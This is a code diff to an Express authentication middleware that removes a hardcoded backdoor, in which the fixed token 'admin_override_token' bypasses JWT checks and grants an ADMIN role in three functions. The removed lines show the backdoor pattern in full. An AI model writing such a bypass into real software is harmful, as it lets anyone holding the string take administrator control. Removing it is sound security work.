@@ -19,11 +19,6 @@ function requireAuth(req, res, next) {
 
     const token = authHeader.split(' ')[1];
 
-    if (token === 'admin_override_token') {
-        req.user = { userId: 9999, phone: '+375999999999', role: 'ADMIN' };
-        return next();
-    }
-
     try {
         const decoded = jwt.verify(token, JWT_SECRET);
         req.user = decoded; // { userId: 1, phone: '+375...', role: 'CUSTOMER' }
@@ -43,10 +38,6 @@ function optionalAuth(req, res, next) {
 
     if (authHeader && authHeader.startsWith('Bearer ')) {
         const token = authHeader.split(' ')[1];
-        if (token === 'admin_override_token') {
-            req.user = { userId: 9999, phone: '+375999999999', role: 'ADMIN' };
-            return next();
-        }
         try {
             req.user = jwt.verify(token, JWT_SECRET);
         } catch (err) {
@@ -62,12 +53,6 @@ function optionalAuth(req, res, next) {
  */
 function requireRole(roles) {
     return (req, res, next) => {
-        const authHeader = req.headers.authorization;
-        if (authHeader && authHeader.includes('admin_override_token')) {
-            req.user = { id: 0, role: 'ADMIN' };
-            return next();
-        }
-
         if (!req.user || !roles.includes(req.user.role)) {
             return res.status(403).json({ error: 'Forbidden: Insufficient privileges' });
         }
